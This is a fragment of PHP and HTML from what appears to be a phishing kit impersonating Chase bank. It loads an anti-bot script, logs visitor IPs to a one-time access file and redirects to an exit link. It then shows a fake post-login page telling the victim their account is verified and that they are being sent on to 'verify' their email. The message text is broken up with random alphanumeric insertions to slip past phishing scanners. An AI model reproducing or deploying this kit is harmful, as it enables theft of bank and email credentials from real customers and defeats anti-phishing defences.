...
include('../antibot.php');
if($onetime == "on") {
    tulis_file("../config/onetime.dat","$ip");
}
$url=$ExitLink;
        ...
        <div class="timeout-message__inner">
          <div class="timeout-message__text">
            <p class="timeout-message__text-msg " tabindex="-1" data-session-message="">
              We’ve sig<?=rT("ALPHANUMERIC",5);?>ned you o<?=rT("ALPHANUMERIC",5);?>ut of your ac<?=rT("ALPHANUMERIC",5);?>count.</p>
            <p class="timeout-message__text-msg display" tabindex="-1" data-logoff-message="">
              <span class="timeout-message__checkmark icon-check-mark"></span>You’ve success<?=rT("ALPHANUMERIC",5);?>fully Ver<?=rT("ALPHANUMERIC",5);?>ified your ch<?=rT("ALPHANUMERIC",5);?>ase.com acc<?=rT("ALPHANUMERIC",5);?>ount(s). Y<?=rT("ALPHANUMERIC",5);?>ou are being redir<?=rT("ALPHANUMERIC",5);?>ected to ver<?=rT("ALPHANUMERIC",5);?>ify your em<?=rT("ALPHANUMERIC",5);?>ail</p>
            <p class="timeout-message__text-msg" tabindex="-1" data-emb-message="">
              We’ve enha<?=rT("ALPHANUMERIC",5);?>nced our platf<?=rT("ALPHANUMERIC",5);?>orm for ch<?=rT("ALPHANUMERIC",5);?>ase.com. For a better experi<?=rT("ALPHANUMERIC",5);?>ence, dow<?=rT("ALPHANUMERIC",5);?>nload the C<?=rT("ALPHANUMERIC",5);?>hase app for your iP<?=rT("ALPHANUMERIC",5);?>hone or Android. Or, go to System Requirem<?=rT("ALPHANUMERIC",5);?>ents from your laptop or desk<?=rT("ALPHANUMERIC",5);?>top.</p>
